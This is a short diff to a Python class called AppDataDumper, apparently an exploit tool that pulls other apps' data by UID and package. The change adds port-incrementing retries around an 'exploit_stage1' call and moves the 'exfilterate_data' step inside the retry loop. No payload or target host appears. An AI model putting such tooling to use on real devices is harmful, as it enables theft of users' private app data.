@@ -89,6 +89,9 @@ class AppDataDumper:
             try:
                 while True:
                     if not exploit.exploit_stage1():
+                        time.sleep(0.5)
+                        self.port += 1
+                        print(f"\t...retrying on port {self.port}...")
                         attempts += 1
                         if attempts >= 3:
                             failed_uid_pkg_map[uid] = pkgs
@@ -96,11 +99,12 @@ class AppDataDumper:
                             raise ExfilterationFailedException()
                     else:
                         break
+
+                if not self.exfilterate_data(pkgs):
+                    print("\tData exfilteration failed")
+                    continue
             except ExfilterationFailedException:
-                continue
-            
-            if not self.exfilterate_data(pkgs):
-                print("\tData exfilteration failed")
+                time.sleep(1)
                 continue
                 
         if len(failed_uid_pkg_map) > 0:
